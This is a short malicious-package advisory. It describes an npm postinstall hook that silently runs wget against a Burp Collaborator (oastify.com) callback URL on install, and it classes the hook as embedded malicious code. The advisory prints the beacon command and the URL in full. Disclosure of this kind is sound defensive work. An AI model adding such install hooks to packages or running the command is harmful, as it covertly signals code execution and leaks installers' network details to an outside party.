summary: postinstall beacon to attacker-controlled OAST endpoint
details: package.json declares a postinstall script that runs `wget --quiet "http://whh5mwn8dlvrjgpe32tqrnu3eukl8kw9.oastify.com"` on `npm install`. The destination is a unique-subdomain Burp Suite Collaborator (oastify.com) OAST endpoint — infrastructure used to confirm out-of-band code execution via DNS/HTTP callbacks. The package advertises no functionality consistent with this fetch; the postinstall has no purpose other than proving install-time code execution on the installer's machine and leaking the host's outbound IP / network reachability to the attacker. Plain HTTP, no pinned content, no declared package purpose — pure beacon.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
